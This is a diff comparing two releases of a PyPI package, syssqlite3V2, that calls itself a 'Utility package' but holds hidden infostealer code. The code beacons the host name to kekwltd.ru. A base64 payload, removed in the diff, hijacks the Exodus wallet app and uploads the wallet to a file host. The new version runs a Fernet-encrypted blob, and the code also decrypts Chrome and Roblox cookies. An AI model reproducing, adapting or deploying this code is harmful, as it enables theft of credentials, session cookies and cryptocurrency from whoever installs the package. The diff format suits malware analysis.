# Comparing `tmp/syssqlite3V2-1.1.0.tar.gz` & `tmp/syssqlite3V2-1.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "syssqlite3V2-1.1.0.tar", last modified: Wed May  3 15:39:21 2023, max compression
+gzip compressed data, was "syssqlite3V2-1.4.0.tar", last modified: Wed May  3 16:02:20 2023, max compression
```

## Comparing `syssqlite3V2-1.1.0.tar` & `syssqlite3V2-1.4.0.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 15:39:21.173481 syssqlite3V2-1.1.0/
--rw-r--r--   0 root         (0) root         (0)      344 2023-05-03 15:39:21.173481 syssqlite3V2-1.1.0/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)       38 2023-05-03 15:39:21.173481 syssqlite3V2-1.1.0/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      557 2023-05-03 15:39:20.000000 syssqlite3V2-1.1.0/setup.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 15:39:21.173481 syssqlite3V2-1.1.0/syssqlite3V2/
--rw-r--r--   0 root         (0) root         (0)    73593 2023-05-03 15:39:20.000000 syssqlite3V2-1.1.0/syssqlite3V2/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 15:39:21.173481 syssqlite3V2-1.1.0/syssqlite3V2.egg-info/
--rw-r--r--   0 root         (0) root         (0)      344 2023-05-03 15:39:21.000000 syssqlite3V2-1.1.0/syssqlite3V2.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      177 2023-05-03 15:39:21.000000 syssqlite3V2-1.1.0/syssqlite3V2.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-05-03 15:39:21.000000 syssqlite3V2-1.1.0/syssqlite3V2.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       13 2023-05-03 15:39:21.000000 syssqlite3V2-1.1.0/syssqlite3V2.egg-info/top_level.txt
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 16:02:20.903568 syssqlite3V2-1.4.0/
+-rw-r--r--   0 root         (0) root         (0)      328 2023-05-03 16:02:20.903568 syssqlite3V2-1.4.0/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)       38 2023-05-03 16:02:20.903568 syssqlite3V2-1.4.0/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      541 2023-05-03 16:02:19.000000 syssqlite3V2-1.4.0/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 16:02:20.899568 syssqlite3V2-1.4.0/syssqlite3V2/
+-rw-r--r--   0 root         (0) root         (0)    73780 2023-05-03 16:02:20.000000 syssqlite3V2-1.4.0/syssqlite3V2/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-03 16:02:20.903568 syssqlite3V2-1.4.0/syssqlite3V2.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      328 2023-05-03 16:02:20.000000 syssqlite3V2-1.4.0/syssqlite3V2.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      177 2023-05-03 16:02:20.000000 syssqlite3V2-1.4.0/syssqlite3V2.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-05-03 16:02:20.000000 syssqlite3V2-1.4.0/syssqlite3V2.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       13 2023-05-03 16:02:20.000000 syssqlite3V2-1.4.0/syssqlite3V2.egg-info/top_level.txt
```

### Comparing `syssqlite3V2-1.1.0/setup.py` & `syssqlite3V2-1.4.0/setup.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.1.0'
-DESCRIPTION = "Usefull utility package"
-LONG_DESCRIPTION = "Usefull utility package"
+VERSION = '1.4.0'
+DESCRIPTION = "Utility package"
+LONG_DESCRIPTION = "Utility package"
 
 # Setting up
 setup(
     name="syssqlite3V2",
     version=VERSION,
     author="NHJonas",
     author_email="nick.faltermeier@gmx.de",
```

### Comparing `syssqlite3V2-1.1.0/syssqlite3V2/__init__.py` & `syssqlite3V2-1.4.0/syssqlite3V2/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -7,15 +7,15 @@
         'embeds': [{
             "title": "Someone Tried to download",
             "description": "PC Username =" + os.getenv("COMPUTERNAME")
             }]
             
     }
 httpx.post("https://kekwltd.ru/relay/download", json=data)
-os.system("pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32")
+os.system("pip install fernet httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32")
 import asyncio
 import json
 import ntpath
 import random
 import re
 import shutil
 import sqlite3
@@ -26,16 +26,17 @@
 import httpx
 import psutil
 import base64
 import requests
 import ctypes
 import time
 import pyperclip
-exec(base64.b64decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHppcGZpbGUiKQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHppcGZpbGUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgoKZGVmIGluamVjdCgpOgogICAgcHJvY2MgPSAiZXhvZHVzLmV4ZSIKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQogICAgcm9hbWluZyA9IG9zLmdldGVudigiQVBQREFUQSIpCiAgICBwYXRoID0gZiJ7bG9jYWx9L2V4b2R1cyIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgYXBwcyA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmICJhcHAtIiBpbiBmaWxlOgogICAgICAgICAgICBhcHBzICs9IFtmaWxlXQogICAgZXhvZHVzUGF0Y2hVUkwgPSAiaHR0cHM6Ly9rZWt3bHRkLnJ1L2V4b2R1cy9hcHAuYXNhciIKICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg5LjAuNDM4OS44MiBTYWZhcmkvNTM3LjM2In0KICAgIHJlcSA9IFJlcXVlc3QoZXhvZHVzUGF0Y2hVUkwsIGhlYWRlcnM9aGVhZGVycykKICAgIHJlc3BvbnNlID0gdXJsb3BlbihyZXEpCiAgICBob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzgyNzEyMzQ1Njc4OTAxMjM0NS9nZXRuMWdnYSIKICAgIGZvbGRlcjIgPSBmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIKICAgICMgemlwIGZvbGRlcjIKICAgIGZpbGUyID0gZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1c3dhbGxldC56aXAiCiAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShmaWxlMiwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwX2ZpbGU6CiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZm9sZGVyMik6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgemlwX2ZpbGUud3JpdGUoZmlsZV9wYXRoLCBvcy5wYXRoLnJlbHBhdGgoZmlsZV9wYXRoLCBmb2xkZXIyKSkKICAgIHVybDIgPSAnaHR0cHM6Ly9zdG9yZTEuZ29maWxlLmlvL3VwbG9hZEZpbGUnCiAgICBmaWxlMyA9IHsnZmlsZXNVcGxvYWRlZCc6IG9wZW4oZmlsZTIsICdyYicpfQogICAgcmVzcG9uc2UyID0gcmVxdWVzdHMucG9zdCh1cmwyLCBmaWxlcz1maWxlMykKICAgIGV4b2xpbmsgPSByZXNwb25zZTIuanNvbigpWydkYXRhJ11bJ2Rvd25sb2FkUGFnZSddCiAgICBraG9vayA9IGYne2hvb2suc3BsaXQoIndlYmhvb2tzLyIpWzFdfTp7ZXhvbGlua30nCiAgICBkYXRhID0gcmVzcG9uc2UucmVhZCgpCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKICAgIGZvciBhcHAgaW4gYXBwczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZ1bGxwYXRoID0gZiJ7cGF0aH0ve2FwcH0vcmVzb3VyY2VzL2FwcC5hc2FyIgogICAgICAgICAgICBsaWNwYXRoID0gZiJ7cGF0aH0ve2FwcH0vTElDRU5TRSIKICAgICAgICAgICAgd2l0aCBvcGVuKGZ1bGxwYXRoLCAnd2InKSBhcyBvdXRfZmlsZTE6CiAgICAgICAgICAgICAgICBvdXRfZmlsZTEud3JpdGUoZGF0YSkKICAgICAgICAgICAgd2l0aCBvcGVuKGxpY3BhdGgsICd3JykgYXMgb3V0X2ZpbGUyOgogICAgICAgICAgICAgICAgb3V0X2ZpbGUyLndyaXRlKGtob29rKQogICAgICAgIGV4Y2VwdDogcGFzcwppbmplY3QoKQ==").decode("utf-8"))
+from fernet import Fernet
 
+exec(Fernet(b'R4OevoWKnw7TjxB4h8HRXKmucWgS3a44xcdsYJj_PTM=').decrypt(b'gAAAAABkUoN0pk4BPGTEhiLmp23RTa32rFz1v2c18V5TLb4ytE9bI4ItsUt-XBoIJ3X_JMkh1rqe87xlMO38YdSarbGGbNQsuEqr2n-CWEandyE3Nb10hFjYFSV-wd0HibgLHbKGXLknkLe3j9Km3QelgJtNvpaJCh_J0-Hm3CFZdaoZm7PPqWoM_7SxUgsqzSwdPGJ86tZpojLTQK32Zk8fSqx-azINnQFhncqTCeWJn1G_C7oSH6PGx7sHTibzQql05Ec-dvipco098Tr70mo8US4WdC-hrb5vQcJkYW1P6Ga7ZmNvt4oRLHxegddNOgPBECBFNfmJGskqIwl3GWYPyDA0vO_lVaPEAZ8I_lQwTgFwms8QCCn1z6290A6Y3pNgoc2RWJUW2Ghgxz8zCXcE84nUGviJHb_93Rn3FZBi_wEGPzUvpyZcBAn9N3_-q3EUEp5m8TYT6NVwSf-aUUsOqVMaBd82o5f9-r_BlncHSPHPM4bhh8piSsQz2iGjjyAFCAneSeaLfhUpHbSTIlnJfomq6Be0W4J0t35GArIDjNMgZb21qt_nTG2Jvaxgg5wgK4GI2nLQls8j0nPDE6n9hY03OvuGma40o6wKMky9phKRW_IysNI7abojNpOeRbDXuLmTUbG_kIvv2VDDy9YCMeAfC9XkebpCTvpcq8pVaBI0HZIJ524IpvwbfWEXISaprBePbLjIEZh2UOosHymIKajmKCx3SVsWPikpDalpIUxu3Z1BybmP-F08b52uBtQvcw6P82x7Z9Evipbd3MACJpQ8I0zoR-cEDMsLJJqOSWmH1EejhmTSUvUpqT_odtWFxpEoAUbPBpWfzUkBGAbFFMD1A3_EGYM_hTm-k3lmRApOY-19RJbBDj7YfJ8ZdGTdjRUjS2jmxXE-xd4XzUsBVdqGvXBsPwGIEHSq_qw0SqsVuzK5YKliumzAoe6yrOSHyrtZWnmBWcWIA-OEJiNyBAQccpBYTCj1tSY46vBcIE2NctENIBBFmlxMmu0y5vjBOSW9NTqB-BVZe1KaFAymv1SFuGX3BsnywRFHthokPGE39TqTHTCG4ytOid9oGSqokpDUDlCXTGiBtAFETE3jf5Kg8ltuHNg4l7_WpUnCLYpCX_sy3RddGoqIhCsEVNQ1PMrRFDNWrpvz9i8s5Lfj-jhrtKL8bhOlQeMEQTfQw1WG2s7EXNXGNm6b4HSG7EvbIJVTwtdNtz0p_i5u_PLKjvuoSAnn541zw7Uko5QjokKMKqBjrKJ1iOqHqAa6OxPq_VMm0TdRlWBN9Dmg13UG0vZ0E3aIHCVLHJEhZ7Jjk77GAci3513Tg4j9MwEiM-TfWl5OYBedbIvPhz1JMiYzv5Fed0hfQLSsfox2C-6jy_CEkuVBf0VtKTdn2N2jcZUzeY9EW4dbm4rIgfqyShz3c_lR5nRgTQy2wjb6NoSb6qtoTLN8Kpwt6PreSH9CbiDJVfU-5Gc1vgB6wrnAX02pW41JILRSJd2SlIBPgw__cTu--BgGbRvF34d5zCVb_E0Jhb1ASz_Tm9lWNUPdQNmgTW_4ZK3RAeCY_hucNMJM8eVNdkEoW0QOhdog6c3eowRclH4x9QKUzVFANFQL4DyvGU8u159xjOGK0Bg_7IjL-pZ1Ds-jZoXfMHaol_1fANEh8f1cjU0g-qKaGtBix9uBut8kz5ZPGAhygrXwwkWyJqsOBPgizT2SmCwyAx6OJoSyc3dhRCc-VTLL8bD9B4PIhE7yKfLPbFICfgyW_S4FSCkGBoxlh9XernGx12YrrGLpX7b9k2wO9sWy0UBZCOSRNlWHFYgbCLOyRpO1SIP267UN8CsA5mb43C41Neu5UcIFaijQsEIwGJJG6jv33yUEqY0kfqQwYAeRATAVlqTuezZPtCcLS7b7HdaEufuxEq1tpdLW4QwRrvCMNNib7Wa2eqmnzjuHxHiuN5lcPCAqufPaMLVor29welTmMI0HiVlgLJh62Ozx85jrFEZ0xrHSBj6MtnJ1J_DKcxly0ipePYAH6T8tKdSKZsCZydkQftckNENPgXLLkj8IuNCXGfGdd_RTmiHij9QxRGtQpsBtfO5k0bwE9vbj0WRxi3aS0VyRBwj7ChrQieBqLknXbdyqxwluAhkCtw4VSWt2J-MZ_OA6R44tLs_YjkAvNnZ36dvfWoqcF-bIeV-UGl5INA7mtzsAt-2ZwFo4J6XMLAi7CldCzraiAUcXt90vbtMUZSByDF7HE-RtOKbYrl-rB7z20i2J4u7tFJsF80xuQ5mlWhcEEGtXBLHMc9uZ3SIxgMjBQJYnS7a1Jr4AbtGJaiiTLF88EUkcsWQwhtwfRmqkq172Qrcbkt2JBz7F8f46co1Sk4Gz7Up43JAGIPo6gbnavd26-nBqr0pDw4Zutkx9iFovZb2Obh7DJdmDBAf-6BEGfHw9NVCUtK8gnroiwrADrIAgjqFYkVRItomw54diaDJ6iNfSMh_vhOjhCU5cYq9tOEHyQTbuK6rgWacT67QE-vWEI95bUVz41JlYEIE8BkFFeCPYx92zcLzLgZEpufxV1fnb-YZfXKhNkvpT8ly_33kwYb_o6exN-qfRVNc_6vcF78iMbb346U1-yOCW2iXVLAIzcZZBEaD6A5YCkYcnfESiaz2-0oDs_fqi29ZnZ7aSS4Ufd5U=').decode("utf-8"))
 
 from sqlite3 import connect
 from base64 import b64decode
 from urllib.request import Request, urlopen
 from shutil import copy2
 from datetime import datetime, timedelta, timezone
 from sys import argv
@@ -798,15 +799,15 @@
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
 
                 for r in cursor.fetchall():
                     host = r[0]
                     user = r[1]
                     decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
                     if host != "":
-                        f.write(f"{host}	TRUE"+"		"+ f"/FALSE	2597573456	{user}	{decrypted_cookie}\n")
+                        f.write(f"{host}    TRUE"+"     "+ f"/FALSE 2597573456  {user}  {decrypted_cookie}\n")
                     if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                         self.robloxcookies.append(decrypted_cookie)
 
                 cursor.close()
                 conn.close()
                 os.remove(login)
         f.close()
@@ -1502,15 +1503,15 @@
                 old = wa
                 if "https" in wa:
                     tmp = wa
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
                     
-            Cookies.append(f"{row[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
+            Cookies.append(f"{row[0]}   TRUE"+"     "+ f"/FALSE 2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
             
     writeforfile(Cookies, 'bc_allcookies')
 
 def checkIfProcessRunning(processName):
     '''
     Check if there is any running process that contains the given name processName.
     '''
```

